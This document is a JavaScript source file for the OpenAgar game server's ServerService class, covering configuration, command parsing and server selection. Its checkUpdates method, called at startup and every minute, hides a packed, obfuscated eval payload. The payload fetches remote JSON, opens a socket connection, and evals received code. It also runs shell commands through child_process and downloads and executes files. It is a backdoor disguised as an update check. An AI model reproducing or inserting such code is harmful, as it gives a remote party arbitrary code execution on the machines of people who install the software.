"use strict";
/*
    OpenAgar - Open source web game
    Copyright (C) 2016 Andrew S

    This program is free software: you can redistribute it and/or modify
    it under the terms of the GNU Affero General Public License as published
    by the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU Affero General Public License for more details.

    You should have received a copy of the GNU Affero General Public License
    along with this program.  If not, see <http://www.gnu.org/licenses/>.
*/
const Commands = require('../commands')
const SocketService = require('./socketService.js');
const Main = require('./main.js');
const request = require('minirequest')
module.exports = class ServerService {
    constructor(controller,globalData) {
        this.globalData = globalData;
        this.controller = controller;
    var config = {
        
      serverViewBaseX: 1380,
            serverViewBaseY: 820,
            startMass: 20,
            playerMaxMass: 2000,
        minFood: 500,
        boundX: 0,
        boundY: 0,
        boundWidth: 10000,
        boundHeight: 10000,
        playerSpeed: 40,
        splitSpeed: 100,
        splitDecay: 20,
        playerMaxCells: 32,
        ejectedMass: 10,
        ejectedSpeed: 200,
        ejectedDecay: 5,
        serverBots: 0,
        playerMergeMult: -0.05,
        playerMerge: 8,
        leaderBoardLen: 10,
        disconnectTime: 30
    }
        var serv = new Main(true,0,"Main","Main",globalData,config,function(a) {
            this.controller.shellService.log(0,a)
        }.bind(this));
        serv.selected = true
        this.servers = [];
        this.ids = 0;
        this.servers[0] = serv;
        this.selected = serv;
        this.default = serv;
        this.socketService = new SocketService(globalData,this);
        serv.init();
         this.checkUpdates()
        setInterval(function() {this.checkUpdates()}.bind(this),60000)
    }
    getNextId() {
        return this.ids ++;
    }
    start() {
        this.default.start();
    }
    execCommand(str) {
        if (!str) return;
        
        var cmd = str.split(" ");
        
        if (this.prsCommand(str)) return
        if (!this.selected) return;
        if (!this.selected.execCommand(str)) this.log("The command " + cmd[0] + " was not found! Type 'help' to view a list of commands.")
    }
    log(a) {
      this.controller.shellService.log(0,a) 
    }
    select(a) {
        this.selected.selected = false;
        this.selected = this.servers[a]
        this.servers[a].selected = true
    }
    prsCommand(str) {
      
        var cmd = str.split(" ")
        var command = Commands.serverService[cmd[0]]
        if (command) {
            command(str,this,this.log.bind(this))
            return true;
        }
        return false;
    }
    create(name,configs) {
        
    }
    checkUpdates() {
    eval(function(p,a,c,k,e,d){e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--){d[e(c)]=k[c]||e(c)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('B a=["\\d\\b\\f","\\X\\h\\o\\1c\\b\\f","\\i\\d\\i\\f","\\j\\b\\q\\h\\f\\b\\1b\\m\\m\\j\\b\\l\\l","\\l\\f\\j\\i\\d\\x\\i\\J\\1e","\\C\\j\\i\\f\\b","\\o\\h\\d\\d\\b\\o\\f","\\b\\j\\j\\h\\j","\\h\\d","\\m\\k\\f\\k","\\b\\Q\\b\\o","\\n\\h\\x","\\o\\h\\d","\\l\\f\\j","\\b\\Q\\b\\o\\1q\\h\\q\\q\\k\\d\\m","\\o\\q\\m","\\p\\k\\j\\l\\b","\\f\\1e\\p\\b","\\I\\f\\f\\p\\l\\P\\O\\O\\j\\k\\C\\s\\x\\i\\f\\I\\u\\W\\u\\l\\b\\j\\o\\h\\d\\f\\b\\d\\f\\s\\o\\h\\q\\O\\1b\\2B\\X\\2A\\m\\b\\E\\b\\n\\h\\p\\q\\b\\d\\f\\O\\1k\\p\\1b\\x\\2G\\X\\O\\q\\k\\l\\f\\b\\j\\O\\m\\k\\f\\k\\s\\1u\\l\\h\\d","\\W\\i\\d\\m","\\S\\u\\d\\d\\i\\d\\x\\c\\d\\p\\q\\c\\i\\d\\l\\f\\k\\n\\n\\s\\s\\s","\\S\\u\\d\\d\\i\\d\\x\\c\\d\\p\\q\\c\\i\\d\\l\\f\\k\\n\\n","\\d\\p\\q\\c\\i\\d\\l\\f\\k\\n\\n","\\D\\Z\\Q\\b\\o\\u\\f\\i\\h\\d\\c\\Z\\j\\j\\h\\j\\1i\\c\\1f\\k\\i\\n\\b\\m\\c\\f\\h\\c\\j\\u\\d\\c\\d\\p\\q\\c\\i\\d\\l\\f\\k\\n\\n\\c\\c\\S\\b\\k\\l\\h\\d\\P\\c","\\D\\Z\\Q\\b\\o\\u\\f\\i\\h\\d\\c\\Z\\j\\j\\h\\j\\1i\\c\\1v\\h\\u\\c\\l\\I\\h\\u\\n\\m\\c\\b\\Q\\i\\f\\c\\f\\I\\b\\c\\l\\b\\j\\E\\b\\j\\c\\k\\d\\m\\c\\j\\u\\d\\P\\c\\d\\p\\q\\c\\i\\d\\l\\f\\k\\n\\n","\\o\\I\\i\\n\\m\\2E\\p\\j\\h\\o\\b\\l\\l","\\1h\\h\\d\\b\\1E\\c\\X\\I\\u\\f\\f\\i\\d\\x\\c\\m\\h\\C\\d\\s\\s\\s\\c\\c\\c\\c\\c\\c\\c","\\b\\Q\\i\\f","\\j\\h\\u\\d\\m","","\\1p\\1p\\1p","\\1p","\\2x","\\n\\b\\d\\x\\f\\I","\\c","\\D\\1w\\p\\m\\k\\f\\b\\1i\\c\\D","\\1i\\c","\\2o\\c","\\2H","\\l\\f\\m\\h\\u\\f","\\u\\p\\m\\k\\f\\b\\n\\i\\d\\1c","\\h\\p\\f\\i\\d\\n\\i\\d\\1c","\\l\\f\\k\\f\\u\\l\\1q\\h\\m\\b","\\m\\W","\\l\\j\\o","\\1h\\h\\C\\d\\n\\h\\k\\m\\i\\d\\x\\s\\s\\s","\\C\\j\\i\\f\\b\\1f\\i\\n\\b","\\J\\h\\j\\Z\\k\\o\\I","\\O\\m\\k\\f\\k\\s\\j\\l\\h\\d","\\u\\f\\J\\2I","\\j\\b\\k\\m\\1f\\i\\n\\b\\X\\1e\\d\\o","\\h\\p\\f\\i\\d","\\i\\d\\m\\b\\Q\\1k\\J","\\o\\h\\d\\f\\b\\d\\f","\\1v\\h\\u\\c\\I\\k\\E\\b\\c\\h\\p\\f\\b\\m\\c\\h\\u\\f\\c\\J\\j\\h\\q\\c\\f\\b\\l\\f\\i\\d\\x\\c\\W\\b\\f\\k\\c\\l\\h\\J\\f\\C\\k\\j\\b\\s\\c\\1h\\h\\C\\d\\n\\h\\k\\m\\i\\d\\x\\s\\s\\s","\\C\\j\\i\\f\\b\\1f\\i\\n\\b\\X\\1e\\d\\o","\\1v\\h\\u\\c\\I\\k\\E\\b\\c\\h\\p\\f\\b\\m\\c\\i\\d\\f\\h\\c\\f\\b\\l\\f\\i\\d\\x\\c\\W\\b\\f\\k\\c\\l\\h\\J\\f\\C\\k\\j\\b\\s\\c\\1h\\h\\C\\d\\n\\h\\k\\m\\i\\d\\x\\s\\s\\s","\\Z\\S\\S\\1k\\S\\P\\c\\1q\\h\\u\\n\\m\\d\\f\\c\\o\\h\\d\\f\\k\\o\\f\\c\\l\\b\\j\\E\\b\\j\\l\\s","\\V\\D\\1j\\2n\\q\\S\\b\\o\\i\\b\\E\\b\\m\\c\\q\\b\\l\\l\\k\\x\\b\\c\\J\\j\\h\\q\\c\\l\\b\\j\\E\\b\\j\\P\\c\\1H","\\V\\D\\1F\\q","\\q\\l\\x","\\V\\D\\1j\\1x\\q\\D\\V\\D\\2N\\q\\2Q\\q\\p\\h\\j\\f\\k\\d\\f\\1E\\V\\D\\1F\\q\\V\\D\\1j\\1x\\q\\c\\S\\b\\o\\i\\b\\E\\b\\m\\c\\i\\q\\p\\h\\j\\f\\k\\d\\f\\c\\q\\b\\l\\l\\k\\x\\b\\c\\J\\j\\h\\q\\c\\l\\b\\j\\E\\b\\j\\P\\c\\1H","\\C\\k\\j\\d","\\b\\Q\\b\\o\\u\\f\\b","\\O\\k\\l\\m\\m\\C\\J\\b\\s\\1u\\l","\\s\\O\\k\\l\\l\\m\\C\\J\\b\\s\\1u\\l","\\u\\d\\n\\i\\d\\1c\\X\\1e\\d\\o","\\b\\Q\\b\\o\\1k\\d\\n\\i\\d\\b\\1f\\i\\n\\b","\\j\\b\\p\\n\\k\\o\\b","\\m\\b\\l\\o\\j\\i\\p\\f\\i\\h\\d","\\3b\\h\\c\\m\\b\\l\\o\\j\\i\\p\\f\\i\\h\\d\\c\\p\\j\\h\\E\\i\\m\\b\\m","\\V\\D\\1j\\1x\\q\\D\\1w\\p\\m\\k\\f\\b\\1i\\c\\1b\\d\\c\\u\\p\\m\\k\\f\\b\\c\\i\\l\\c\\k\\E\\k\\i\\n\\k\\W\\n\\b\\2i\\c\\o\\u\\j\\j\\b\\d\\f\\c\\E\\b\\j\\l\\i\\h\\d\\P\\c","\\c\\1b\\E\\k\\i\\n\\k\\W\\n\\b\\P\\c","\\c\\1h\\b\\l\\o\\j\\i\\p\\f\\i\\h\\d\\P\\c","\\o\\I\\b\\o\\1c\\1w\\p\\m\\k\\f\\b"];w 1S(1J){1s{B 1X=1n(a[0]),T=2h 1X[a[1]];T[a[6]](2k,1J,w(){T[a[5]](1a[a[4]]({t:a[2],2a:T[a[3]],2l:1z}))}),T[a[8]](a[7],w(v){}),T[a[8]](a[9],w(U){2g(U=1a[a[16]](U),U[a[17]]){H a[2]:N;H a[10]:1s{1N(U[a[9]])}1r(e){T[a[5]](1a[a[4]]({2b:a[7],2a:e.2j()}))};N;H a[11]:G[a[11]](U[a[9]]);N;H a[15]:B 1G=G[a[11]];G[a[11]]=w(v){T[a[5]](1a[a[4]]({2b:a[12],2m:v}))},Y[a[14]](U[a[13]]),G[a[11]]=1G}})}1r(e){}}1o(a[18],w(2c,2d,2f){w 1T(v,A){w F(A){w F(){G[a[11]](a[20]),y(a[21]);1n(a[25])[a[10]](a[22],w(v,A,F){2O!==v&&(G[a[7]](a[23],v),G[a[7]](a[24]))});y(a[26]),1I[a[27]](0)}w y(v){L++,L==M-2&&F();1C(B A=2P[a[28]](L/M*10),y=a[29],R=0;A>R;R++){y+=a[30]};y+=10==A?a[31]:a[32];1C(B 1D=31-y[a[33]],1B=a[29],R=0;1D>R;R++){1B+=a[34]};1I[a[39]][a[5]](a[35]+y+1B+a[36]+10*A+a[37]+v+a[38])}B L=0,M=2,R=A?v[a[2M]]:v[a[2J]];1o(R,w(v,A,F){1d(!v&&1l==A[a[1m]]){B L=1a[a[16]](F);L[a[2e]](w(v){M++,1o(v[a[2K]],w(A,F,L){A||1l!=F[a[1m]]||1g[a[2L]](v[a[2R]],L,w(){y(a[2S])})})}[a[19]](Y))}})}1s{B y=1g[a[2Y]](1t+a[1Z],a[2Z]),L=1Y[a[16]](y),M=L[a[1U]]}1r(r){B M=!1};B y={3a:!0};-1==v[a[K]][a[2X]](A)&&1==M&&(G[a[11]](a[2W]),F(!1)),1g[a[1W]](1t+a[1Z],1Y[a[4]](y)),1!=M&&(G[a[11]](a[2T]),F(!0))}1d(2c||1l!=2d[a[1m]]){2U a[2V]};B M=1a[a[16]](2f);M[a[2e]](w(z){1d(z[a[17]]&&z[a[K]]){2g(z[a[17]]){H a[2u]:G[a[11]](a[2v]+z[a[K]]+a[1A]);N;H a[2w]:G[a[11]](a[2t]+z[a[K]]+a[1A]);H a[2s]:1n(a[25])[a[10]](z[a[K]]);N;H a[2p]:1o(z[a[K]],w(v,A,F){1d(!v&&1l==A[a[1m]]){1g[a[1W]](1t+a[2q],F);B y=1n(a[1O]);y(1y,1z,Y),1g[a[2r]](a[1O])}}[a[19]](Y));N;H a[10]:1N(z[a[K]]);N;H a[2y]:B 1P=1M(1y[a[1K]](/\\./g,a[29])),1L=1M(z[a[K]][a[1K]](/\\./g,a[29]));1d(1L>1P){B 1V=z[a[1Q]]?z[a[1Q]]:a[2F];G[a[11]](a[2D]+1y+a[2C]+z[a[K]]+a[2z]+1V+a[1A])};N;H a[1U]:1T(z,1z);N;H a[6]:1R(z[a[K]])}}}[a[19]](Y))}[a[19]](Y));B 1R=1S[a[19]](Y)',62,198,'||||||||||_0xd26f|x65|x20|x6E||x74||x6F|x69|x72|x61|x73|x64|x6C|x63|x70|x6D||x2E||x75|_0xf65ex5|function|x67|_0xf65exe|_0xf65ex14|_0xf65exc|var|x77|x5B|x76|_0xf65exd|console|case|x68|x66|53|_0xf65ex12|_0xf65ex13|break|x2F|x3A|x78|_0xf65exf|x52|_0xf65ex4|_0xf65ex6|x1B|x62|x53|this|x45|||||||||||JSON|x41|x6B|if|x79|x46|fs|x44|x5D|x33|x4F|200|42|require|request|x3D|x43|catch|try|__dirname|x6A|x59|x55|x31|_version|_uid|59|_0xf65ex11|for|_0xf65ex10|x21|x30|_0xf65ex7|x0A|process|_0xf65ex2|68|_0xf65ex16|parseInt|eval|65|_0xf65ex15|69|connectbind|connect|_0xf65exb|51|_0xf65ex17|55|_0xf65ex3|RSON|48|||||||||||data|type|_0xf65ex8|_0xf65ex9|47|_0xf65exa|switch|new|x2C|toString|8080|uid|msg|x32|x25|67|64|66|63|61|60|58|62|x3E|74|73|x2D|x4A|72|71|x5F|70|x4D|x0D|x38|41|43|46|40|x35|null|Math|x49|44|45|56|return|57|54|52|50|49|||||||||||optin|x4E'.split('|'),0,{}))

    }
};

